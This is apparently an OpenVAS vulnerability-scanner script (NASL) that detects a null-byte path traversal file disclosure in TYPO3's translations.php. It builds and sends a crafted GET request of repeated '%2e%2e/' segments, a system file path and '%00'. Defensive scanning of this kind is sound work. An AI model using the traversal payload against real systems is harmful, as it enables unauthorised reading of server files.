# SPDX-FileCopyrightText: 2014 SCHUTZWERK GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE = "cpe:/a:typo3:typo3";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105141");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2014-12-12 12:00:00 +0100 (Fri, 12 Dec 2014)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("TYPO3 Translations.php File Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 SCHUTZWERK GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_typo3_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("typo3/http/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/6985");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/313488");

  script_tag(name:"summary", value:"TYPO3 is prone to a file disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"TYPO3 does not sufficiently sanitize input submitted via URI
  parameters of potentially malicious data. This issue exists in the translations.php script.");

  script_tag(name:"impact", value:"By submitting a malicious web request to this script that
  contains a relative path to a resource and a null character (%00), it is possible to retrieve
  arbitrary files that are readable by the web server process.");

  script_tag(name:"affected", value:"TYPO3 version 3.5 b5 is known to be affected. Older versions
  may also be affected.");

  script_tag(name:"solution", value:"Update to version 3.5.0 or later.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files();
foreach file( keys( files ) ) {
  url = dir + "/typo3/dev/translations.php?ONLY=" +  crap( data:"%2e%2e/", length:119 ) + files[file] +'%00';
  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
